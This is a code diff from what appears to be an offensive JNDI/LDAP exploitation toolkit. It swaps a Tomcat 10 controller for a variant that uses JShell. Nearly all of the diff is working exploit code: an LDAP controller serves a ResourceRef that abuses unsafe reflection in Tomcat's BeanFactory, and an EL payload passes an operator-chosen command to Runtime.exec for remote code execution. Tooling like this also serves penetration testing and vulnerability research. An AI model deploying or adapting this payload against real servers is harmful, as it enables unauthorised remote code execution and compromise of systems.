@@ -10,14 +10,11 @@ import org.apache.naming.ResourceRef;
 
 import javax.naming.StringRefAddr;
 
-import static artsploit.Utilities.makeJavaScriptString;
 import static artsploit.Utilities.serialize;
 
 /**
  * Yields:
- *  Identical to the original Tomcat controller, except that jakarta.el.ELProcessor is used. This is necessary for
- *  Tomcat 10+, because it's using the new package names from Jakarta EE instead of Java EE.
- *
+ *  RCE via arbitrary bean creation in {@link org.apache.naming.factory.BeanFactory}
  *  When bean is created on the server side, we can control its class name and setter methods,
  *   so we can leverage {@link jakarta.el.ELProcessor#eval} method to execute arbitrary Java code via EL evaluation
  *
@@ -28,26 +25,20 @@ import static artsploit.Utilities.serialize;
  *  - tomcat-embed-core.jar
  *  - tomcat-embed-el.jar
  *
- * @author artsploit:
+ * @author artsploit
  */
-@LdapMapping(uri = { "/o=tomcat10" })
-public class Tomcat10 implements LdapController {
-
-    String payload = ("{" +
-            "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
-            ".newInstance().getEngineByName(\"JavaScript\")" +
-            ".eval(\"java.lang.Runtime.getRuntime().exec(${command})\")" +
-            "}")
-            .replace("${command}", makeJavaScriptString(Config.command));
+@LdapMapping(uri = { "/o=tomcat10-jshell" })
+public class Tomcat10JShell implements LdapController {
+    String payload = "{\"\".getClass().forName(\"jdk.jshell.JShell\").getMethod(\"create\").invoke(null).eval(\"java.lang.Runtime.getRuntime().exec(${command})\")}"
+            .replace("${command}", "\\\"" + Config.command + "\\\"");
 
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
-
         System.out.println("Sending LDAP ResourceRef result for " + base + " with jakarta.el.ELProcessor payload");
 
         Entry e = new Entry(base);
         e.addAttribute("javaClassName", "java.lang.String"); //could be any
 
-        // Prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory.
+        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
         ResourceRef ref = new ResourceRef("jakarta.el.ELProcessor", null, "", "",
                 true, "org.apache.naming.factory.BeanFactory", null);
         ref.add(new StringRefAddr("forceString", "x=eval"));
